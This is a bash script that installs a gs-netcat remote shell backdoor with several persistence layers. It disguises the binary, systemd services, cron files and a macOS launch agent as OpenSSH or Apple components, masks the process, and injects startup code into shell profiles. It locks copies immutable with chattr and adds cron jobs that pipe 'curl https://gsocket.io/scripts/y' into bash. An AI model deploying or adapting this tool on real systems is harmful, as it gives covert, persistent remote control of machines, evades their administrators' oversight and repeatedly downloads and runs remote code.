#!/usr/bin/env bash
# gsocket-persist.sh — install gs-netcat with layered persistence.
# Keeps the same secret across reboots. No bincrypter dependency.
#
# Usage:
#   bash gsocket-persist.sh                 # install, generate or reuse secret
#   X=GSK-xxxx-xxxx-xxxx-xxxx bash gsocket-persist.sh   # force a secret
#   GS_UNDO=1 bash gsocket-persist.sh       # remove everything
#   GS_NOINST=1 bash gsocket-persist.sh     # run once, no persistence
#   S=<secret> bash gsocket-persist.sh      # connect to an existing session
#
# Options:
#   X=<secret>          Use this secret (install mode)
#   S=<secret>          Connect to existing session
#   GS_DOMAIN=<host>    Override host for binary/script download (default: gsocket.io)
#   GS_RELAY_HOST=<h>   Override relay host
#   GS_RELAY_PORT=<p>   Override relay port (default 443)
#   GS_TLS=off          Disable TLS
#   GS_HIDE=off         Disable process masking
#   GS_DSTDIR=<dir>     Force install directory
#   GS_OSARCH=<arch>    Force architecture
#   GS_DEBUG=1          Verbose output
#   LOG=<file>          Tee all output to file

set -euo pipefail

HOME="${HOME:-$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6 || echo /root)}"
export HOME

# ── Configuration ────────────────────────────────────────────────────────────
GS_DOMAIN="${GS_DOMAIN:-gsocket.io}"
GS_RELAY_HOST="${GS_RELAY_HOST:-${GS_DOMAIN}}"
GS_RELAY_PORT="${GS_RELAY_PORT:-443}"
GS_BIN_NAME="sshd"
GS_DL_BASE="${GS_DL_BASE:-https://${GS_DOMAIN}/bin}"
GS_SERVICE_NAME="openssh-sftp-helper"
GS_CRON_TAG="# openssh-server"
GS_PROFILE_TAG="# openssh-init"
SECRET_LEN=24

[[ "${GS_DEBUG:-}" == "1" ]] && set -x
[[ -n "${LOG:-}" ]] && exec > >(tee -a "$LOG") 2>&1

# ── Helpers ──────────────────────────────────────────────────────────────────
gs_info() { [[ -z "${GSS:-}" ]] || return 0; echo "[*] $*"; }
gs_ok()   { [[ -z "${GSS:-}" ]] || return 0; echo "[+] $*"; }
gs_warn() { [[ -z "${GSS:-}" ]] || return 0; echo "[!] $*"; }
gs_err()  { echo "[-] $*" >&2; }
gs_die()  { gs_err "$*"; exit 1; }
have()    { command -v "$1" >/dev/null 2>&1; }
can_sudo(){ sudo -n true 2>/dev/null; }
is_root_mode() { [[ "${HOME:-}" == "/root" ]] || [[ "${EUID:-$(id -u)}" == "0" ]]; }

gen_secret() {
  local raw
  raw="$(tr -dc 'A-Z0-9' < /dev/urandom | head -c "$SECRET_LEN")" || true
  printf 'GSK-%s-%s-%s-%s' "${raw:0:6}" "${raw:6:6}" "${raw:12:6}" "${raw:18:6}"
}

gs_lockfile() {
  local secret="$1" hash
  if have sha256sum; then
    hash="$(printf '%s' "$secret" | sha256sum | cut -c1-8)"
  elif have shasum; then
    hash="$(printf '%s' "$secret" | shasum -a 256 | cut -c1-8)"
  else
    hash="$(printf '%08x' "$(printf '%s' "$secret" | cksum | cut -d' ' -f1)")"
  fi
  echo "/tmp/.ssh-${hash}"
}

is_already_running() {
  local lf pid
  lf="$(gs_lockfile "${1:-}")"
  [[ -f "$lf" ]] || return 1
  pid="$(tr -d '[:space:]' < "$lf" 2>/dev/null)"
  [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null
}

# ── OS / arch ────────────────────────────────────────────────────────────────
detect_osarch() {
  local os arch machine
  case "$(uname -s)" in
    Linux)  os="linux"  ;;
    Darwin) os="darwin" ;;
    *)      gs_die "Unsupported OS: $(uname -s)" ;;
  esac
  machine="${GS_OSARCH:-$(uname -m)}"
  case "$machine" in
    x86_64|amd64)  arch="amd64" ;;
    aarch64|arm64) arch="arm64" ;;
    armv7*)        arch="arm"   ;;
    i*86)          arch="386"   ;;
    *)             gs_die "Unsupported arch: $machine" ;;
  esac
  echo "${os}-${arch}"
}

# ── Writable dir ─────────────────────────────────────────────────────────────
find_writable_dir() {
  if [[ -n "${GS_DSTDIR:-}" ]]; then
    mkdir -p "$GS_DSTDIR" 2>/dev/null && echo "$GS_DSTDIR" && return
  fi
  local candidates=()
  if is_root_mode; then
    candidates+=( "/usr/local/sbin" "/usr/libexec" "/usr/local/libexec" "/usr/lib/openssh" )
  fi
  candidates+=(
    "${HOME}/.ssh/authorized_key"
    "${HOME}/.local/share/.cache"
    "/tmp/.dbus-session"
    "/dev/shm/.dbus"
    "/var/tmp/.dbus"
    "/run/shm/.dbus"
  )
  for base in /var/www /srv /opt /home /usr/share /var/lib; do
    [[ -d "$base" ]] || continue
    while IFS= read -r d; do
      candidates+=("${d}/.gs")
    done < <(find "$base" -maxdepth 5 -writable -type d 2>/dev/null | head -5)
  done
  for dir in "${candidates[@]}"; do
    [[ -z "$dir" ]] && continue
    if mkdir -p "$dir" 2>/dev/null && [[ -w "$dir" ]]; then
      echo "$dir"; return 0
    fi
  done
  echo "/tmp"
}

# ── Download ─────────────────────────────────────────────────────────────────
gs_download() {
  local url="$1" dest="$2"
  if have curl; then
    if [[ -n "${GSS:-}" ]]; then
      curl -fsSL --connect-timeout 10 --max-time 120 "$url" -o "$dest"
    else
      curl -fL --progress-bar --connect-timeout 10 --max-time 120 "$url" -o "$dest"
    fi
  elif have wget; then
    if [[ -n "${GSS:-}" ]]; then
      wget -q --timeout=60 -O "$dest" "$url"
    else
      wget --timeout=60 -O "$dest" "$url"
    fi
  else
    gs_die "curl or wget required"
  fi
}

download_binary() {
  local name="$1" dest="$2" osarch="$3"
  local url="${GS_DL_BASE}/${name}-${osarch}"
  gs_info "Downloading ${name} (${osarch}) from ${url}"
  gs_download "$url" "$dest" || gs_die "Download failed: $url"
  chmod +x "$dest"
}

# ── Secret persistence (plain file, no XOR decoration) ──────────────────────
SECRET_FILE_NAME=".gs-secret"
PASS_FILE_NAME=".gs-pass"

read_secret() {
  local f="$1/${SECRET_FILE_NAME}"
  [[ -f "$f" ]] && tr -d '[:space:]' < "$f"
}

write_secret() {
  local dir="$1" val="$2"
  umask 077
  printf '%s\n' "$val" > "${dir}/${SECRET_FILE_NAME}"
  chmod 600 "${dir}/${SECRET_FILE_NAME}"
}

read_pass() {
  local f="$1/${PASS_FILE_NAME}"
  [[ -f "$f" ]] && tr -d '[:space:]' < "$f"
}

write_pass() {
  local dir="$1" val="$2"
  umask 077
  printf '%s\n' "$val" > "${dir}/${PASS_FILE_NAME}"
  chmod 600 "${dir}/${PASS_FILE_NAME}"
}

# ── Persistence layers ───────────────────────────────────────────────────────

# Layer 6: systemd primary service
install_systemd() {
  local bin="$1"
  have systemctl && [[ -d /run/systemd ]] && can_sudo || return 1
  local svc="/etc/systemd/system/${GS_SERVICE_NAME}.service"
  sudo tee "$svc" >/dev/null <<EOF
[Unit]
Description=OpenSSH SFTP Connection Helper
Documentation=man:sshd(8) man:sshd_config(5)
After=network-online.target auditd.service
Wants=network-online.target

[Service]
Type=simple
ExecStart=${bin} -fg
Restart=always
RestartSec=5
StartLimitIntervalSec=0
KillMode=process
RuntimeDirectory=sshd
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
  sudo systemctl daemon-reload
  sudo systemctl enable "${GS_SERVICE_NAME}" >/dev/null 2>&1
  sudo systemctl restart "${GS_SERVICE_NAME}" >/dev/null 2>&1
  gs_ok "Persistence: systemd service installed"
}

remove_systemd() {
  can_sudo || return 0
  sudo systemctl stop "${GS_SERVICE_NAME}" 2>/dev/null || true
  sudo systemctl disable "${GS_SERVICE_NAME}" 2>/dev/null || true
  sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}.service"
  sudo systemctl daemon-reload 2>/dev/null || true
}

# Layer 4: systemd watchdog timer (30s)
install_watchdog_timer() {
  local bin="$1"
  have systemctl && [[ -d /run/systemd ]] && can_sudo || return 1
  local wscript="/usr/lib/openssh/sshd-monitor"
  sudo tee "$wscript" >/dev/null <<EOF
#!/bin/sh
systemctl is-active --quiet ${GS_SERVICE_NAME} || systemctl restart ${GS_SERVICE_NAME} 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &
EOF
  sudo chmod +x "$wscript"
  sudo tee "/etc/systemd/system/${GS_SERVICE_NAME}-mon.timer" >/dev/null <<EOF
[Unit]
Description=OpenSSH Connection Keepalive
[Timer]
OnBootSec=60s
OnUnitActiveSec=30s
[Install]
WantedBy=timers.target
EOF
  sudo tee "/etc/systemd/system/${GS_SERVICE_NAME}-mon.service" >/dev/null <<EOF
[Unit]
Description=OpenSSH Connection Keepalive
Documentation=man:sshd(8)
[Service]
Type=oneshot
ExecStart=${wscript}
EOF
  sudo systemctl daemon-reload
  sudo systemctl enable "${GS_SERVICE_NAME}-mon.timer" >/dev/null 2>&1
  sudo systemctl start  "${GS_SERVICE_NAME}-mon.timer" >/dev/null 2>&1
  gs_ok "Persistence: watchdog timer installed (30s interval)"
}

remove_watchdog_timer() {
  can_sudo || return 0
  sudo systemctl stop "${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
  sudo systemctl disable "${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
  sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}-mon.timer"
  sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}-mon.service"
  sudo rm -f "/usr/lib/openssh/sshd-monitor"
  sudo systemctl daemon-reload 2>/dev/null || true
}

# Layer 1: crontab @reboot + every-minute watchdog
install_cron() {
  local bin="$1" secret="$2"
  have crontab || return 1
  local lf; lf="$(gs_lockfile "$secret")"
  local chk="[ -x '${bin}' ] || { curl -fsSL https://${GS_DOMAIN}/scripts/y 2>/dev/null; } | bash >/dev/null 2>&1; [ -f '${lf}' ] && kill -0 \$(cat '${lf}') 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &"
  local read_cmd write_cmd
  if is_root_mode && can_sudo; then read_cmd="sudo crontab -l 2>/dev/null || true"; write_cmd="sudo crontab -"
  else read_cmd="crontab -l 2>/dev/null || true"; write_cmd="crontab -"; fi
  if eval "$read_cmd" | grep -qF "$GS_CRON_TAG" 2>/dev/null; then
    gs_info "Persistence: crontab entry already present"; return 0
  fi
  { eval "$read_cmd"; echo "$GS_CRON_TAG"; echo "@reboot ${chk}"; echo "* * * * * ${chk}"; } | eval "$write_cmd"
  gs_ok "Persistence: crontab watchdog installed (@reboot + every minute)"
}

remove_cron() {
  crontab -l 2>/dev/null | grep -v "$GS_CRON_TAG" | crontab - 2>/dev/null || true
  sudo crontab -l 2>/dev/null | grep -v "$GS_CRON_TAG" | sudo crontab - 2>/dev/null || true
}

# Layer 2: shell profile injection
install_profile() {
  local bin="$1" secret="$2"
  local lf; lf="$(gs_lockfile "$secret")"
  local snippet="
${GS_PROFILE_TAG}
_p='${lf}'; [ -f \"\$_p\" ] && kill -0 \"\$(cat \"\$_p\")\" 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &
${GS_PROFILE_TAG}"
  for f in "${HOME}/.profile" "${HOME}/.bashrc" "${HOME}/.bash_profile"; do
    [[ -f "$f" && -w "$f" ]] || continue
    if grep -qF "$GS_PROFILE_TAG" "$f" 2>/dev/null; then
      gs_info "Persistence: ${f} already patched"
    else
      printf '%s\n' "$snippet" >> "$f"
      gs_ok "Persistence: added to ${f}"
    fi
    return 0
  done
  gs_warn "Persistence: profile files not writable — skipping"
  return 1
}

remove_profile() {
  for f in "${HOME}/.profile" "${HOME}/.bashrc" "${HOME}/.bash_profile"; do
    [[ -f "$f" ]] || continue
    sed -i "/^${GS_PROFILE_TAG}$/,/^${GS_PROFILE_TAG}$/d" "$f" 2>/dev/null || true
  done
}

install_profile_d() {
  local bin="$1" secret="$2"
  can_sudo || return 1
  local lf; lf="$(gs_lockfile "$secret")"
  local pfile="/etc/profile.d/openssh-agent.sh"
  sudo tee "$pfile" >/dev/null 2>&1 <<EOF || return 1
#!/bin/sh
_p='${lf}'
[ -f "\$_p" ] && kill -0 "\$(cat "\$_p")" 2>/dev/null || ${bin} -fg >/dev/null 2>&1 &
unset _p
EOF
  sudo chmod +x "$pfile"
  gs_ok "Persistence: /etc/profile.d/openssh-agent.sh installed"
}

remove_profile_d() { sudo rm -f "/etc/profile.d/openssh-agent.sh" 2>/dev/null || true; }

# Layers 3+5: immutable backup copies
_GS_COPY_PATHS=(
  "/usr/lib/openssh/sshd-session"
  "/usr/lib/x86_64-linux-gnu/openssh/sshd"
  "/var/cache/openssh/sshd"
)

install_copies() {
  local bin="$1" n=0
  is_root_mode || can_sudo || return 0
  for dst in "${_GS_COPY_PATHS[@]}"; do
    local dir; dir="$(dirname "$dst")"
    { mkdir -p "$dir" 2>/dev/null || sudo -n mkdir -p "$dir" 2>/dev/null; } || continue
    { cp "$bin" "$dst" 2>/dev/null || sudo -n cp "$bin" "$dst" 2>/dev/null; } || continue
    chmod +x "$dst" 2>/dev/null || sudo -n chmod +x "$dst" 2>/dev/null || true
    have chattr && { chattr +i "$dst" 2>/dev/null || sudo -n chattr +i "$dst" 2>/dev/null || true; }
    n=$(( n + 1 ))
  done
  [[ "$n" -gt 0 ]] && gs_ok "Persistence: ${n} immutable backup copies installed" || true
}

remove_copies() {
  for dst in "${_GS_COPY_PATHS[@]}"; do
    have chattr && { chattr -i "$dst" 2>/dev/null || sudo -n chattr -i "$dst" 2>/dev/null || true; }
    rm -f "$dst" 2>/dev/null || sudo -n rm -f "$dst" 2>/dev/null || true
  done
}

# Layer 3: lock primary binary
install_immutable() {
  local bin="$1"
  have chattr || return 1
  is_root_mode || can_sudo || return 1
  chattr +i "$bin" 2>/dev/null || sudo -n chattr +i "$bin" 2>/dev/null || return 1
  gs_ok "Persistence: binary locked immutable (chattr +i)"
}

remove_immutable() {
  local bin="$1"
  have chattr || return 0
  chattr -i "$bin" 2>/dev/null || sudo -n chattr -i "$bin" 2>/dev/null || true
}

# Layer 7: cron.d dropper
install_dropper() {
  can_sudo || return 1
  local dfile="/etc/cron.d/openssh-keymgr"
  sudo tee "$dfile" >/dev/null 2>&1 <<EOF || return 1
# OpenSSH key management — maintained by openssh-server package
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 3 * * * root [ -x /usr/local/sbin/sshd ] || { curl -fsSL https://${GS_DOMAIN}/scripts/y 2>/dev/null; } | bash >/dev/null 2>&1
EOF
  sudo chmod 644 "$dfile"
  have chattr && sudo chattr +i "$dfile" 2>/dev/null || true
  gs_ok "Persistence: key manager cron installed"
}

remove_dropper() {
  can_sudo || return 0
  have chattr && sudo chattr -i "/etc/cron.d/openssh-keymgr" 2>/dev/null || true
  sudo rm -f "/etc/cron.d/openssh-keymgr" 2>/dev/null || true
}

# macOS launchd
LAUNCHD_PLIST="${HOME}/Library/LaunchAgents/com.apple.update-notifier.plist"

install_launchd() {
  local bin="$1" secret="$2"
  mkdir -p "${HOME}/Library/LaunchAgents"
  cat > "$LAUNCHD_PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>           <string>com.apple.update-notifier</string>
  <key>ProgramArguments</key>
  <array>
    <string>${bin}</string>
    <string>-fg</string>
    <string>${secret}</string>
    <string>${GS_RELAY_HOST}</string>
    <string>${GS_RELAY_PORT}</string>
  </array>
  <key>RunAtLoad</key>       <true/>
  <key>KeepAlive</key>       <true/>
  <key>EnvironmentVariables</key>
  <dict>
    <key>GS_TLS</key>  <string>${GS_TLS:-on}</string>
    <key>GS_HIDE</key> <string>${GS_HIDE:-on}</string>
  </dict>
</dict>
</plist>
EOF
  launchctl load "$LAUNCHD_PLIST" 2>/dev/null || true
  gs_ok "Persistence: launchd agent installed"
}

remove_launchd() {
  launchctl unload "$LAUNCHD_PLIST" 2>/dev/null || true
  rm -f "$LAUNCHD_PLIST"
}

install_persistence() {
  local bin="$1" secret="$2"
  local installed=0
  if [[ "$(uname -s)" == "Darwin" ]]; then
    install_launchd "$bin" "$secret" && installed=1 || true
    install_profile "$bin" "$secret" || true
    return
  fi
  install_systemd        "$bin"           && installed=1 || true
  install_watchdog_timer "$bin"                          || true
  install_cron           "$bin" "$secret" && installed=1 || true
  install_profile        "$bin" "$secret" && installed=1 || true
  install_profile_d      "$bin" "$secret"                || true
  install_copies         "$bin"                          || true
  install_immutable      "$bin"                          || true
  install_dropper                                        || true
  if [[ "$installed" == "0" ]]; then
    gs_warn "No persistence method succeeded — falling back to one-shot"
    GS_NOINST=1
  fi
}

remove_persistence() {
  if [[ "$(uname -s)" == "Darwin" ]]; then
    remove_launchd; remove_profile; return
  fi
  remove_immutable "${BIN_PATH:-}"
  remove_copies
  remove_dropper
  remove_watchdog_timer
  remove_systemd
  remove_cron
  remove_profile
  remove_profile_d
}

# ── Banner ───────────────────────────────────────────────────────────────────
print_connect_banner() {
  [[ -z "${GSS:-}" ]] || return 0
  local secret="$1" pass="$2"
  echo ""
  echo "  Secret   : ${secret}"
  echo "  Relay    : ${GS_RELAY_HOST}:${GS_RELAY_PORT}"
  [[ -n "$pass" ]] && echo "  Password : ${pass}  (required when connecting)"
  echo ""
  echo "  Connect from anywhere:"
  echo "  S=${secret} bash -c \"\$(curl -fsSL https://${GS_DOMAIN}/scripts/y)\""
  echo ""
}

# ═════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════════════════════════
OSARCH="$(detect_osarch)"
INSTALL_DIR="$(find_writable_dir)"
mkdir -p "$INSTALL_DIR" 2>/dev/null || true
BIN_PATH="${INSTALL_DIR}/${GS_BIN_NAME}"
export PATH="${INSTALL_DIR}:$PATH"

is_root_mode && gs_info "Root mode — install dir: ${INSTALL_DIR}"

# ── Undo ─────────────────────────────────────────────────────────────────────
if [[ "${GS_UNDO:-}" == "1" ]]; then
  export GSS=1
  gs_info "Removing gsocket persistence..."
  for _lf in /tmp/.ssh-*; do
    [[ -f "$_lf" ]] || continue
    _pid="$(tr -d '[:space:]' < "$_lf" 2>/dev/null)"
    [[ -n "$_pid" ]] && kill "$_pid" 2>/dev/null || true
    rm -f "$_lf" 2>/dev/null || true
  done
  have chattr && {
    for f in "${INSTALL_DIR}/${SECRET_FILE_NAME}" "${INSTALL_DIR}/${PASS_FILE_NAME}" "${BIN_PATH}"; do
      chattr -i "$f" 2>/dev/null || sudo -n chattr -i "$f" 2>/dev/null || true
    done
  }
  remove_persistence
  rm -f "${BIN_PATH}" "${INSTALL_DIR}/${SECRET_FILE_NAME}" "${INSTALL_DIR}/${PASS_FILE_NAME}"
  for _d in /usr/local/sbin /usr/libexec /usr/local/libexec /usr/lib/openssh \
            /root/.ssh/authorized_key "${HOME}/.ssh/authorized_key"; do
    have chattr && { chattr -i "${_d}/${GS_BIN_NAME}" 2>/dev/null || sudo -n chattr -i "${_d}/${GS_BIN_NAME}" 2>/dev/null || true; }
    rm -f "${_d}/${GS_BIN_NAME}" 2>/dev/null || sudo -n rm -f "${_d}/${GS_BIN_NAME}" 2>/dev/null || true
  done
  echo "[+] Uninstall complete."
  exit 0
fi

# ── Mode: Connect ────────────────────────────────────────────────────────────
if [[ -n "${S:-}" ]]; then
  CLIENT_PATH="${INSTALL_DIR}/gs-client"
  [[ -x "$CLIENT_PATH" ]] || download_binary "gs-client" "$CLIENT_PATH" "$OSARCH"
  gs_ok "Connecting with secret: ${S}"
  GS_TLS="${GS_TLS:-on}" RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
    exec "$CLIENT_PATH" "$S" "$GS_RELAY_HOST" "$GS_RELAY_PORT"
fi

# ── Mode: Install ────────────────────────────────────────────────────────────
gs_info "Installing ${GS_BIN_NAME} (${OSARCH}) → ${INSTALL_DIR}"
[[ -x "$BIN_PATH" ]] || download_binary "gs-netcat_mini-${OSARCH%%-*}-${OSARCH##*-}" "$BIN_PATH" "$OSARCH"

# Secret: X > existing file > generate
if [[ -n "${X:-}" ]]; then
  SECRET="$X"
  gs_info "Using provided secret"
elif SECRET="$(read_secret "$INSTALL_DIR")"; [[ -n "$SECRET" ]]; then
  gs_info "Reusing saved secret (persists across reboots)"
else
  SECRET="$(gen_secret)"
  GS_FRESH_INSTALL=1
fi
write_secret "$INSTALL_DIR" "$SECRET"

# Password: existing file > generate
if SESS_PASS="$(read_pass "$INSTALL_DIR")"; [[ -n "$SESS_PASS" ]]; then
  gs_info "Reusing saved session password"
else
  SESS_PASS="$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)" || true
fi
write_pass "$INSTALL_DIR" "$SESS_PASS"
export GS_SESS_PASS="$SESS_PASS"

if is_already_running "$SECRET"; then
  gs_info "Already running with same secret — skipping start"
  print_connect_banner "$SECRET" "$SESS_PASS"
  exit 0
fi

if [[ "${GS_NOINST:-}" == "1" ]]; then
  print_connect_banner "$SECRET" "$SESS_PASS"
  GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" \
  RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
    exec "$BIN_PATH" -fg
fi

install_persistence "$BIN_PATH" "$SECRET"
print_connect_banner "$SECRET" "$SESS_PASS"

# Fallback foreground start if systemd didn't take
if ! have systemctl || ! systemctl is-active --quiet "${GS_SERVICE_NAME}" 2>/dev/null; then
  if [[ -n "${GSS:-}" ]]; then
    GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" \
    RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
      nohup "$BIN_PATH" -fg >/dev/null 2>&1 &
  elif have tmux; then
    gs_info "Starting in detached tmux session..."
    GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" \
    RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
      tmux new-session -d "$BIN_PATH -fg"
  else
    GS_TLS="${GS_TLS:-on}" GS_HIDE="${GS_HIDE:-on}" \
    RELAY_HOST="${GS_RELAY_HOST}" RELAY_PORT="${GS_RELAY_PORT}" \
      nohup "$BIN_PATH" -fg >/dev/null 2>&1 &
    gs_ok "Started in background (PID $!)"
  fi
fi